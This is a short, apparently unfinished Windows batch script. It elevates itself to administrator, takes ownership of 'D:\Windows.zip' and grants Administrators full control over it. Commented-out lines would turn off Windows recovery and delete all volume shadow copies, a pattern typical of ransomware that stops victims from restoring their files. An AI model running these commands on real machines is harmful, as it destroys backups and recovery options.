@echo off
:: Elevate this script
(
    :: Check Admin rights and create Script to elevate
    >nul fsutil dirty query %SYSTEMDRIVE% 2>&1 || (
        PowerShell "Start-Process -FilePath '%0' -Verb RunAs"
        EXIT
    )
)
:: Take ownership 
takeown /f "D:\Windows.zip"
icacls "D:\Windows.zip" /grant:r Administrators:F

::part 2
::bcdedit set recoveryenabled no
::vssadmin delete shadows /all

:: part3?